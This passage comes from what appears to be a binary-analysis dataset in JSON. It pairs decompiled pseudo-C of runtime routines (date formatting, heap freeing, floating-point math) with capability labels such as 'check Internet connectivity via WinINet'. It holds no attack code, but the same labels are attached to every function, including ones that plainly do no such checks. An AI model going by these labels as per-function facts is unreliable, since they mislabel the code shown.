pcVar6 = *(arg_1ch + 0xd0 + arg_10h[6] * 4);\n                        goto code_r0x0045ca22;\n                    }\n                }\n                else if (uVar3 == 0x42) {\n                    if (arg_10h[4] < 0xc) {\n                        pcVar6 = *(arg_1ch + 0x11c + arg_10h[4] * 4);\n                        goto code_r0x0045ca22;\n                    }\n                }\n                else {\n                    if (uVar3 != 0x43) {\n                        return 0;\n                    }\n                    if (arg_10h[5] + 0x76c < 10000) {\n                        uVar10 = (arg_20h != 0) - 1U & 0x30;\n                        uVar9 = 2;\n                        uVar3 = (arg_10h[5] + 0x76c) / 100;\n                        goto code_r0x0045c803;\n                    }\n                }\n                goto code_r0x0045ca3a;\n            }\n            cVar2 = fcn.0045c788(arg_8h, 0x6d, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n            if (cVar2 == '\\0') goto code_r0x0045c908;\n            fcn.0045d2a2(0x4745fc, arg_14h, arg_18h);\n            cVar2 = fcn.0045c788(arg_8h, 100, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n            if (cVar2 == '\\0') goto code_r0x0045c908;\n            fcn.0045d2a2(0x4745fc, arg_14h, arg_18h);\n            uVar9 = 0x79;\n        }\n        else {\n            if (uVar3 != 0x46) {\n                if (uVar3 == 0x47) {\n                    if (9999 < arg_10h[5] + 0x76c) goto code_r0x0045ca3a;\n                    uVar10 = 0x30;\n                    uVar9 = 4;\n                    iVar4 = fcn.0045c75d(arg_10h[5], arg_10h[6], arg_10h[7]);\n                    uVar3 = iVar4 + 0x76c;\n                    goto code_r0x0045c803;\n                }\n                if (uVar3 != 0x48) {\n                    if (uVar3 != 0x49) {\n                        return 0;\n                    }\n                    if (0x17 < arg_10h[2]) goto code_r0x0045ca3a;\n                    uVar3 = arg_10h[2] % 0xc;\n                    if (uVar3 == 0) {\n                        uVar3 = 0xc;\n                    }\n                    uVar10 = (arg_20h != 0) - 1U & 0x30;\ncode_r0x0045ca82:\n                    uVar9 = 2;\n                    goto code_r0x0045c803;\n                }\n                uVar3 = arg_10h[2];\n                bVar7 = uVar3 < 0x17;\n                bVar8 = uVar3 == 0x17;\n                goto code_r0x0045ce96;\n            }\n            cVar2 = fcn.0045c788(arg_8h, 0x59, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n            if (cVar2 == '\\0') goto code_r0x0045c908;\n            fcn.0045d2a2(0x475b0c, arg_14h, arg_18h);\n            cVar2 = fcn.0045c788(arg_8h, 0x6d, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n            if (cVar2 == '\\0') goto code_r0x0045c908;\n            fcn.0045d2a2(0x475b0c, arg_14h, arg_18h);\n            uVar9 = 100;\n        }\n        goto code_r0x0045c9a5;\n    }\n    if (7 < uVar3 - 0x52) {\n        return 0;\n    }\n    // switch table (8 cases) at 0x45d180\n    switch(*((uVar3 - 0x52) * 4 + 0x45d180)) {\n    case 0x45cf6b:\n        cVar2 = fcn.0045c788(arg_8h, 0x48, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n        if (cVar2 == '\\0') goto code_r0x0045c908;\n        fcn.0045d2a2(str.__n:_t_ + 2, arg_14h, arg_18h);\n        uVar9 = 0x4d;\n        goto code_r0x0045c9a5;\n    case 0x45cfb5:\n        uVar3 = *arg_10h;\n        bVar7 = uVar3 < 0x3c;\n        bVar8 = uVar3 == 0x3c;\ncode_r0x0045ce96:\n        if (!bVar7 && !bVar8) {\ncode_r0x0045ca3a:\n            puVar5 = fcn.0045652e();\n            *puVar5 = 0x16;\n            fcn.004559dd();\n            return 0;\n        }\ncode_r0x0045c8b1:\n        uVar10 = (arg_20h != 0) - 1U & 0x30;\n        uVar9 = 2;\n        break;\n    case 0x45cfc2:\n        cVar2 = fcn.0045c788(arg_8h, 0x48, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n        if (cVar2 == '\\0') goto code_r0x0045c908;\n        fcn.0045d2a2(str.__n:_t_ + 2, arg_14h, arg_18h);\n        cVar2 = fcn.0045c788(arg_8h, 0x4d, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n        if (cVar2 == '\\0') goto code_r0x0045c908;\n        fcn.0045d2a2(str.__n:_t_ + 2, arg_14h, arg_18h);\n        uVar9 = 0x53;\ncode_r0x0045c9a5:\n        cVar2 = fcn.0045c788(arg_8h, uVar9, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\ncode_r0x0045c9b0:\n        if (cVar2 != '\\0') {\n            return 1;\n        }\ncode_r0x0045c908:\n        puVar5 = fcn.0045652e();\n        *puVar5 = 0x16;\n        return 0;\n    case 0x45d02f:\n        uVar10 = arg_10h[6];\n        if (uVar10 < 7) {\n            if (arg_ch == 0x57) {\n                if (uVar10 == 0) {\n                    uVar10 = 6;\n                }\n                else {\n                    uVar10 = uVar10 - 1;\n                }\n            }\n            uVar1 = arg_10h[7];\n            if (uVar1 < 0x16e) {\n                uVar3 = 0;\n                if ((uVar10 <= uVar1) && (uVar3 = uVar1 / 7,  uVar10 <= uVar1 % 7)) {\n                    uVar3 = uVar3 + 1;\n                }\n                uVar10 = (arg_20h != 0) - 1U & 0x30;\n                uVar9 = 2;\n                break;\n            }\n        }\n        goto code_r0x0045ca3a;\n    case 0x45d08a:\n        uVar10 = (arg_20h != 0) - 1U & 0x30;\n        uVar9 = 2;\n        uVar3 = fcn.0045c67a(arg_10h[5], arg_10h[6], arg_10h[7]);\n        break;\n    case 0x45d0ba:\n        arg_20h = 2;\n        goto code_r0x0045ccf4;\n    case 0x45d0cd:\n        uVar3 = arg_10h[5] + 0x76c;\n        if (9999 < uVar3) goto code_r0x0045ca3a;\n        uVar10 = (arg_20h != 0) - 1U & 0x30;\n        uVar9 = 4;\n    }\ncode_r0x0045c803:\n    fcn.0045d1a0(uVar3, uVar9, arg_14h, arg_18h, uVar10);\n    return 1;\n}\n",
        "token_count": 5451
    },
    "004612d2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004612d2(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x496134, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.0045652e();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.004564b5(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "004647f9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.004647f9(double param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint uVar10;\n    bool bVar11;\n    double dVar12;\n    double dVar13;\n    ulong in_XMM1_Qa;\n    double dVar14;\n    uchar auVar15 [16];\n    uint64_t in_XMM2_Qa;\n    int64_t iVar16;\n    uchar auVar17 [16];\n    int64_t iVar18;\n    uint64_t in_XMM3_Qa;\n    uint64_t uVar19;\n    double dVar20;\n    double dVar21;\n    double dVar22;\n    double dVar23;\n    double dVar24;\n    double dVar25;\n    double dVar26;\n    uchar auStack12 [4];\n    \n    dVar12 = param_1 >> 0x2c;\n    uVar1 = param_1 >> 0x30;\n    uVar3 = (SUB82(dVar12, 0) & 0xff) + 1 & 0x1fe;\n    dVar25 = (*0x47bc90 & param_1 | *0x47bca0) * *(uVar3 * 4 + 0x47db98);\n    dVar22 = *(uVar3 * 4 + 0x47db98);\n    dVar13 = *(uVar3 * 8 + 0x47dfb0);\n    dVar24 = *(uVar3 * 8 + 0x47dfb8);\n    uVar7 = 0x7fef - uVar1;\n    uVar3 = SUB84(param_1, 0);\n    uVar9 = param_1 >> 0x20;\n    dVar23 = param_1;\n    if ((uVar1 - 0x10 | uVar7) < 0x80000000) {\n        uVar7 = 0;\n        uVar8 = 0x3fe7f;\ncode_r0x00464876:\n        uVar4 = (dVar25 >> 0x26 & 0xff) + 1 & 0x1fe;\n        dVar25 = dVar25 * *(uVar4 * 4 + 0x47e7c0);\n        dVar20 = dVar23 & *0x47bc90 | *0x47bca0;\n        dVar14 = *0x47bce8 & dVar20;\n        in_XMM3_Qa = in_XMM3_Qa >> 0x1f;\n        dVar20 = dVar20 - dVar14;\n        uVar5 = (dVar25 >> 0x1f & 0x1ff) + 1 & 0x3fe;\n        dVar21 = dVar22 * *(uVar4 * 4 + 0x47e7c0) * *(uVar5 * 4 + 0x47f3e0);\n        dVar25 = dVar25 * *(uVar5 * 4 + 0x47f3e0);\n        dVar23 = dVar13 + *(uVar4 * 8 + 0x47ebd0) + (dVar12 - uVar8 >> 8) + *(uVar5 * 8 + 0x47fbf0);\n        dVar12 = dVar24 + *(uVar4 * 8 + 0x47ebd8) + *(uVar5 * 8 + 0x47fbf8);\n        dVar13 = *0x47bce8 & dVar21;\n        dVar21 = dVar21 - dVar13;\n        dVar26 = *0x47bcf0 + dVar25;\n        dVar24 = dVar23 + dVar26;\n        dVar22 = CONCAT44(param_3, param_2);\n        uVar2 = param_3 >> 0x10;\n        dVar23 = dVar23 - dVar24;\n        uVar4 = dVar24 >> 0x30;\n        dVar13 = (((dVar25 - dVar13 * dVar14) - dVar14 * dVar21) - dVar13 * dVar20) - dVar20 * dVar21;\n        dVar14 = dVar26 - dVar13;\n        dVar25 = dVar24 - dVar13;\n        uVar8 = uVar2 & 0x7ff0;\n        if (uVar8 < 0x7ff0) {\n            iVar6 = (uVar8 - 0x3ff0) + (uVar4 & 0x7ff0);\n            if ((0x40a0U - iVar6 | iVar6 - 0x3c70U) < 0x80000000) {\ncode_r0x004649c8:\n                dVar20 = *0x47bce8 & dVar22;\n                dVar21 = *0x47bce8 & dVar25;\n                dVar13 = (dVar23 + dVar26) - (dVar13 - (dVar24 - dVar25));\n                auVar17 = pinsrw(ZEXT816(0), 0x4060, 3);\n                dVar24 = dVar20 * dVar21 * SUB168(auVar17, 0);\n                uVar3 = ROUND(dVar24);\n                dVar22 = dVar20 * (dVar25 - dVar21) + dVar21 * (dVar22 - dVar20) + (dVar25 - dVar21) * (dVar22 - dVar20)\n                ;\n                if (0 < (0x1ff7f - uVar3 | uVar3 + 0x1e1ff)) {\n                    iVar6 = (uVar3 & 0x7f) * 0x10;\n                    auVar17 = pinsrw(ZEXT816(0), 0x3f80, 3);\n                    uVar3 = ((uVar7 + uVar3 & 0xffffff80) + 0x1ff80 << 0x2d) >> 0x20;\n                    dVar25 = *(\"\\aAiFC.\u05bf\" + iVar6 + 8) * (uVar3 << 0x20);\n                    dVar22 = (dVar24 - ((dVar24 + *0x47bc80) - *0x47bc80)) * SUB168(auVar17, 0) +\n                             dVar22 + ((*0x480c00 * dVar14 + *0x480c10 * dVar14 * dVar14) * dVar14 * dVar14 +\n                                       *0x480c08 * dVar14 + str._aAiFC.._0_8_ * dVar14 * dVar14 + dVar12 + dVar13) *\n                                      CONCAT44(param_3, param_2);\n                    return dVar22 * dVar22 * dVar25 * (*0x47bcd0 + *0x47bcc0 * dVar22) * dVar22 * dVar22 +\n                           *(iVar6 + 0x480c28) * SUB128((ZEXT412(uVar3) << 0x40) >> 0x20, 0) +\n                           (*0x47bcd8 + *0x47bcc8 * dVar22) * dVar22 * dVar22 * dVar25 + *0x47bce0 * dVar22 * dVar25 +\n                           dVar25;\n                }\n                if (uVar3 < 1) {\n                    if (uVar3 < -0x3fdff) {\ncode_r0x00465227:\n                        uVar10 = 0x19;\n                        _auStack12 = *0x47bd28 * *0x47bd28 | uVar7 << 0x2d;\n                        goto code_r0x00464fce;\n                    }\n                    uVar7 = uVar7 + 0x80;\n                    uVar9 = (uVar3 & 0xffffff80) + 0x3fe80;\n                    uVar10 = 0;\n                }\n                else {\n                    if (0x3ffff < uVar3) goto code_r0x0046524a;\n                    uVar7 = uVar7 + 0x3ff00;\n                    uVar9 = uVar3 - 0x80 & 0xffffff80;\n                    uVar10 = 0x3ff0;\n                }\n                iVar6 = (uVar3 & 0x7f) * 0x10;\n                uVar3 = (-(uVar9 - 0x1ff80) >> 7) + 2;\n                auVar17 = pinsrw(ZEXT816(0), 0x3f80, 3);\n                uVar8 = (uVar9 << 0x2d) >> 0x20;\n                dVar25 = *(\"\\aAiFC.\u05bf\" + iVar6 + 8) * (uVar8 << 0x20);\n                dVar22 = (dVar24 - ((dVar24 + *0x47bc80) - *0x47bc80)) * SUB168(auVar17, 0) +\n                         dVar22 + ((*0x480c00 * dVar14 + *0x480c10 * dVar14 * dVar14) * dVar14 * dVar14 +\n                                   *0x480c08 * dVar14 + str._aAiFC.._0_8_ * dVar14 * dVar14 + dVar12 + dVar13) *\n                                  CONCAT44(param_3, param_2);\n                _auStack12 = uVar7 << 0x2d;\n                uVar19 = uVar3 + (uVar3 & 0x20);\n                dVar13 = -1 << uVar19 & dVar25;\n                dVar22 = dVar22 * dVar22 * dVar25 * (*0x47bcd0 + *0x47bcc0 * dVar22) * dVar22 * dVar22 +\n                         *(iVar6 + 0x480c28) * SUB128((ZEXT412(uVar8) << 0x40) >> 0x20, 0) +\n                         (*0x47bcd8 + *0x47bcc8 * dVar22) * dVar22 * dVar22 * dVar25 + *0x47bce0 * dVar22 * dVar25;\n                dVar24 = dVar13 + dVar22 & -1 << uVar19;\n                auVar17 = pinsrw(ZEXT816(0), uVar10, 3);\n                dVar22 = dVar22 + (dVar13 - dVar24) + (dVar25 - dVar13);\n                if (uVar9 - 0x1ff80 < 1) {\n                    _auStack12 = dVar22 * _auStack12 + dVar24 * _auStack12;\n                    _auStack12 = _auStack12 + SUB168(auVar17, 0) * _auStack12;\n                    uVar10 = 0x18;\n                    if (((_auStack12 >> 0x30 & 0x7ff0) != 0x7ff0) &&\n                       (uVar10 = 0x19,  (_auStack12 & 0x7ff0000000000000) != 0)) {\n                        return _auStack12;\n                    }\n                }\n                else {\n                    _auStack12 = (dVar22 + dVar24) * _auStack12;\n                    _auStack12 = _auStack12 + SUB168(auVar17, 0) * _auStack12;\n                    uVar10 = 0x18;\n                    if (((_auStack12 >> 0x30 & 0x7ff0) != 0x7ff0) &&\n                       (uVar10 = 0x19,  (_auStack12 & 0x7ff0000000000000) != 0)) {\n                        return _auStack12;\n                    }\n                }\n            }\n            else {\n                dVar24 = dVar22 * dVar25;\n                uVar3 = dVar24 >> 0x30 & 0x7ff0;\n                uVar9 = uVar3 - 0x3c70;\n                if ((0x40a0 - uVar3 | uVar9) < 0x80000000) goto code_r0x004649c8;\n                if (0x7fffffff < uVar9) {\n                    return (uVar7 | 0x1ff80) << 0x2d;\n                }\n                if (((uVar2 ^ (uVar1 & 0x7ff0) + 0xc010) & 0x8000) != 0) goto code_r0x00465227;\ncode_r0x0046524a:\n                uVar10 = 0x18;\n                if (uVar7 == 0) {\n                    _auStack12 = *0x47bd20 * *0x47bd20;\n                }\n                else {\n                    _auStack12 = *0x47bd18 * *0x47bd20;\n                }\n            }\n            goto code_r0x00464fce;\n        }\n        auVar17 = CONCAT88(in_XMM2_Qa, CONCAT44(param_3, param_2));\n        bVar11 = uVar3 == 0;\n        uVar3 = uVar4;\n        if (bVar11) {\n            if (uVar9 == 0x3ff00000) goto code_r0x00464fcb;\n            uVar3 = uVar9;\n            if (uVar9 == 0xbff00000) {\n                return 1;\n            }\n        }\n    }\n    else {\n        auVar17 = CONCAT88(in_XMM2_Qa, CONCAT44(param_3, param_2));\n        uVar8 = param_3 & *0x47bcb4;\n        uVar19 = in_XMM3_Qa >> 0x20;\n        if (uVar8 < 0x7ff00000) {\n            if ((param_2 | uVar8) == 0) {\n                uVar10 = 0x1a;\n                _auStack12 = *0x47bca0;\n                if ((uVar3 | uVar9 & 0x7fffffff) != 0) {\n                    uVar10 = 0x1d;\n                    if (((uVar9 & 0x7fffffff) < 0x7ff00001) && (((uVar9 & 0x7fffffff) < 0x7ff00000 || (uVar3 == 0)))) {\n                        return *0x47bca0;\n                    }\n                }\n                goto code_r0x00464fce;\n            }\n            if (uVar7 < 0) {\n                auVar17 = auVar17 | CONCAT88(in_XMM3_Qa << 0x34, CONCAT44(*0x47bcb4, *0x47bcb0) << 0x34);\n                in_XMM3_Qa = 0;\n                auVar15 = pmaxsw(ZEXT1216(CONCAT48((in_XMM1_Qa >> 0x20 & uVar19) >> 0x14, (uVar8 >> 0x14) - 0x3f3)), 0x0\n                                );\n                iVar16 = SUB168(auVar17, 0) << SUB168(auVar15, 0);\n                iVar18 = SUB168(auVar17 >> 0x40, 0) << SUB168(auVar15 >> 0x40, 0);\n                auVar17 = CONCAT412(-(iVar18 >> 0x20 == 0), \n                                    CONCAT48(-(iVar18 == 0), CONCAT44(-(iVar16 >> 0x20 == 0), -(iVar16 == 0))));\n                uVar2 = SUB161(auVar17 >> 7, 0) & 1 | (SUB161(auVar17 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar17 >> 0x17, 0) & 1) << 2 | (SUB161(auVar17 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar17 >> 0x27, 0) & 1) << 4 | (SUB161(auVar17 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar17 >> 0x37, 0) & 1) << 6 | (SUB161(auVar17 >> 0x3f, 0) & 1) << 7;\n                uVar8 = 0x7fef - uVar7 & 0x7fff;\n                uVar19 = SUB168(auVar17 >> 0x40, 0);\n                if (0x7fef < uVar8) {\n                    auVar17 = CONCAT412(0xffffffff, \n                                        CONCAT48(0xffffffff, \n                                                 CONCAT44(-((*0x47bc90 & param_1) >> 0x20 == 0), \n                                                          -((*0x47bc90 & param_1) == 0))));\n                    if ((SUB161(auVar17 >> 7, 0) & 1 | (SUB161(auVar17 >> 0xf, 0) & 1) << 1 |\n                         (SUB161(auVar17 >> 0x17, 0) & 1) << 2 | (SUB161(auVar17 >> 0x1f, 0) & 1) << 3 |\n                         (SUB161(auVar17 >> 0x27, 0) & 1) << 4 | (SUB161(auVar17 >> 0x2f, 0) & 1) << 5 |\n                         (SUB161(auVar17 >> 0x37, 0) & 1) << 6 | (SUB161(auVar17 >> 0x3f, 0) & 1) << 7) == 0xff) {\n                        if ((param_1 & 0x8000000000000000) != 0) {\n                            if ((uVar2 != 0xff) ||\n                               (iVar16 = CONCAT44(param_3, param_2) << ((param_3 & *0x47bcb4) >> 0x14) - 0x3f4, \n                               iVar18 = uVar19 << (*0x47bcbc >> 0x14), \n                               auVar17 = CONCAT412(-(iVar18 >> 0x20 == 0), \n                                                   CONCAT48(-(iVar18 == 0), \n                                                            CONCAT44(-(iVar16 >> 0x20 == 0), -(iVar16 == 0)))), \n                               (SUB161(auVar17 >> 7, 0) & 1 | (SUB161(auVar17 >> 0xf, 0) & 1) << 1 |\n                                (SUB161(auVar17 >> 0x17, 0) & 1) << 2 | (SUB161(auVar17 >> 0x1f, 0) & 1) << 3 |\n                                (SUB161(auVar17 >> 0x27, 0) & 1) << 4 | (SUB161(auVar17 >> 0x2f, 0) & 1) << 5 |\n                                (SUB161(auVar17 >> 0x37, 0) & 1) << 6 | (SUB161(auVar17 >> 0x3f, 0) & 1) << 7) == 0xff))\n                            {\n                                if ((param_3 & 0x80000000) != 0) {\n                                    return 0;\n                                }\n                                goto code_r0x00464f5f;\n                            }\n                            if ((param_3 & 0x80000000) == 0) {\n                                return *0x47bd08;\n                            }\n                            goto code_r0x00464e19;\n                        }\n                        if ((param_3 & 0x80000000) != 0) {\n                            return 0;\n                        }\n                        goto code_r0x00464f5f;\n                    }\n                    goto code_r0x00464e5f;\n                }\n                if (uVar2 == 0xff) {\n                    in_XMM3_Qa = 0;\n                    iVar16 = CONCAT44(param_3, param_2) << ((param_3 & *0x47bcb4) >> 0x14) - 0x3f4;\n                    iVar18 = uVar19 << ((SUB164(auVar15 >> 0x60, 0) & *0x47bcbc) >> 0x14);\n                    auVar17 = CONCAT412(-(iVar18 >> 0x20 == 0), \n                                        CONCAT48(-(iVar18 == 0), \n                                                 CONCAT44(-(iVar16 >> 0x20 == SUB164(ZEXT816(*0x47bd10) >> 0x20, 0)), \n                                                          -(iVar16 == SUB84(*0x47bd10, 0)))));\n                    in_XMM2_Qa = SUB168(auVar17 >> 0x40, 0);\n                    uVar7 = (SUB161(auVar17 >> 7, 0) & 1 | (SUB161(auVar17 >> 0xf, 0) & 1) << 1 |\n                             (SUB161(auVar17 >> 0x17, 0) & 1) << 2 | (SUB161(auVar17 >> 0x1f, 0) & 1) << 3 |\n                             (SUB161(auVar17 >> 0x27, 0) & 1) << 4 | (SUB161(auVar17 >> 0x2f, 0) & 1) << 5 |\n                             (SUB161(auVar17 >> 0x37, 0) & 1) << 6 | (SUB161(auVar17 >> 0x3f, 0) & 1) << 7) + 0x3ff01 &\n                            0x40000;\n                    if (0xf < uVar8) {\n                        uVar8 = 0xbfe7f;\n                        in_XMM3_Qa = 0;\n                        goto code_r0x00464876;\n                    }\n                    goto code_r0x00464c94;\n                }\n                dVar22 = param_1 >> 0x20;\n                in_XMM2_Qa = uVar19 >> 0x20;\n                uVar8 = uVar3 | uVar9 & 0x7fffffff;\n                uVar7 = 0;\n                dVar23 = dVar12;\n                if (uVar8 != 0) {\n                    uVar10 = 0x1c;\n                    _auStack12 = *0x47bd30;\n                    goto code_r0x00464fce;\n                }\ncode_r0x00464d1a:\n                if ((uVar8 & 0x7fffffff) == 0) {\n                    if ((param_3 & 0x80000000) == 0) {\n                        if ((uVar8 & uVar7 << 0xd) == 0) {\n                            return 0;\n                        }\ncode_r0x00464e19:\n                        return *0x47bd10;\n                    }\n                    uVar10 = 0x1b;\n                    _auStack12 = (uVar8 & uVar7 << 0xd | 0x7ff00000) << 0x20;\n                    goto code_r0x00464fce;\n                }\n            }\n            else {\n                uVar7 = 0;\ncode_r0x00464c94:\n                auVar17 = pinsrw(ZEXT816(0), 0x43f0, 3);\n                dVar23 = SUB168(auVar17, 0) * param_1;\n                uVar8 = uVar9;\n                dVar25 = *0x47bc90;\n                dVar22 = *0x47bca0;\n                if (uVar3 == 0) goto code_r0x00464d1a;\n            }\n            dVar12 = (dVar23 & CONCAT44(*0x47bcb4, *0x47bcb0)) >> 0x2c;\n            uVar8 = (SUB82(dVar12, 0) & 0xff) + 1 & 0x1fe;\n            dVar25 = (dVar25 & dVar23 | dVar22) * *(uVar8 * 4 + 0x47db98);\n            dVar22 = *(uVar8 * 4 + 0x47db98);\n            dVar13 = *(uVar8 * 8 + 0x47dfb0);\n            dVar24 = *(uVar8 * 8 + 0x47dfb8);\n            uVar8 = 0x43e7f;\n            goto code_r0x00464876;\n        }\n        uVar7 = uVar9;\n        if ((0x7fefffff < (uVar9 & 0x7fffffff)) && ((0x7ff00000 < (uVar9 & 0x7fffffff) || (uVar3 != 0)))) {\ncode_r0x00464e5f:\n            _auStack12 = param_1 + param_1;\n            uVar10 = 0x3ee;\n            goto code_r0x00464fce;\n        }\n    }\n    dVar22 = SUB168(auVar17, 0);\n    uVar19 = in_XMM3_Qa & SUB168(auVar17 >> 0x40, 0);\n    auVar15 = CONCAT412(-(uVar19 >> 0x20 == 0), \n                        CONCAT48(-(uVar19 == 0), \n                                 CONCAT44(-((*0x47bc90 & dVar22) >> 0x20 == 0), -((*0x47bc90 & dVar22) == 0))));\n    if ((SUB161(auVar15 >> 7, 0) & 1 | (SUB161(auVar15 >> 0xf, 0) & 1) << 1 | (SUB161(auVar15 >> 0x17, 0) & 1) << 2 |\n         (SUB161(auVar15 >> 0x1f, 0) & 1) << 3 | (SUB161(auVar15 >> 0x27, 0) & 1) << 4 |\n         (SUB161(auVar15 >> 0x2f, 0) & 1) << 5 | (SUB161(auVar15 >> 0x37, 0) & 1) << 6 |\n        (SUB161(auVar15 >> 0x3f, 0) & 1) << 7) == 0xff) {\n        if ((uVar3 | uVar7 ^ 0xbff00000) != 0) {\n            if ((auVar17 & 0x8000000000000000) == 0x0) {\n                if ((uVar1 & 0x7ff0) < 0x3ff0) {\n                    return 0;\n                }\n            }\n            else if (0x3fef < (uVar1 & 0x7ff0)) {\n                return 0;\n            }\ncode_r0x00464f5f:\n            return *0x47bd00;\n        }\ncode_r0x00464fcb:\n        return 1;\n    }\n    uVar10 = 0x3ee;\n    _auStack12 = dVar22 + dVar22;\ncode_r0x00464fce:\n    fcn.0046d6b3(&param_1, &param_2, auStack12, uVar10);\n    return _auStack12;\n}\n",
        "token_count": 6256
    },
    "00465fb2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00465fb2(int32_t arg_8h, int32_t arg_ch, code *arg_10h, uint arg_14h)\n\n{\n    uint32_t arg_8h_00;\n    int32_t iVar1;\n    uint32_t arg_8h_01;\n    uint var_4h;\n    \n    arg_8h_00 = *0x49106c ^ &stack0xfffffffc;\n    if (arg_8h == 0) {\n        fcn.0045bfc6();\n        iVar1 = 0;\n        *(arg_ch + 8) = 0;\n        *(arg_ch + 0xc) = 0;\ncode_r0x00465fdb:\n        *(arg_ch + 0x10) = iVar1;\n    }\n    else {\n        (**0x4742a4)(0, arg_8h, 0, arg_14h);\n        iVar1 = (*arg_10h)();\n        if (iVar1 != -1) {\n            arg_8h_01 = iVar1 + 1;\n            if (*(arg_ch + 0xc) <= arg_8h_01 && arg_8h_01 != *(arg_ch + 0xc)) {\n                iVar1 = fcn.0045c007(arg_8h_01);\n                if (iVar1 != 0) goto code_r0x00466044;\n            }\n            (**0x4742a4)(*(arg_ch + 8), arg_8h, *(arg_ch + 0xc), arg_14h);\n            iVar1 = (*arg_10h)();\n            if ((iVar1 != -1) && (iVar1 != *(arg_ch + 0xc))) {\n                iVar1 = iVar1 + 1;\n                goto code_r0x00465fdb;\n            }\n        }\n        fcn.0045652e();\n    }\ncode_r0x00466044:\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 455
    },
    "00466a70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00466a70(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1dh;\n    \n    if (*(unaff_EBP + -0x1d) != '\\0') {\n        fcn.00456b42(3);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "0046b29e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.0046b29e(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint arg_14h;\n    double in_XMM0_Qa;\n    double dVar3;\n    double dVar4;\n    double dVar5;\n    ushort uStack12;\n    unkbyte6 Stack10;\n    ushort uStack4;\n    \n    uVar1 = in_XMM0_Qa >> 0x30 & 0x7fff;\n    if ((0x408f - uVar1 | uVar1 - 0x3c90) < 0x80000000) {\n        dVar4 = *0x47cc60 * in_XMM0_Qa + *0x47cc40;\n        dVar5 = (*0x47cc68 * in_XMM0_Qa + *0x47cc48) - *0x47cc48;\n        uVar1 = SUB84(dVar4, 0);\n        iVar2 = (uVar1 & 0x3f) * 0x10;\n        dVar3 = (in_XMM0_Qa - *0x47cc70 * (dVar4 - *0x47cc40)) - *0x47cc80 * (dVar4 - *0x47cc40);\n        dVar5 = (in_XMM0_Qa - *0x47cc78 * dVar5) - *0x47cc88 * dVar5;\n        dVar4 = *(iVar2 + 0x481428) | (dVar4 & *0x47cc20) + *0x47cc30 << 0x2e;\n        dVar3 = dVar5 * dVar5 * (*0x47cca8 + *0x47cc98 * dVar5) +\n                dVar3 + *(iVar2 + 0x481420) + dVar3 * dVar3 * dVar3 * dVar3 * (*0x47cca0 + *0x47cc90 * dVar3);\n        if ((uVar1 >> 6) + 0x37eU < 0x77d) {\n            return dVar3 * dVar4 + dVar4;\n        }\n        dVar5 = ~*0x47cc10 & dVar4 | (uVar1 >> 7) + 0x3ff << 0x34;\n        uStack4 = dVar5 >> 0x30;\n        in_XMM0_Qa = (((uVar1 >> 6) - (uVar1 >> 7)) + 0x3ff << 0x34) * (dVar5 + dVar3 * dVar5);\n        if ((in_XMM0_Qa >> 0x30 & 0x7ff0) < 0x7ff0) {\n            if ((in_XMM0_Qa & 0x7ff0000000000000) != 0) goto code_r0x0046b492;\n            arg_14h = 0xf;\n        }\n        else {\n            arg_14h = 0xe;\n    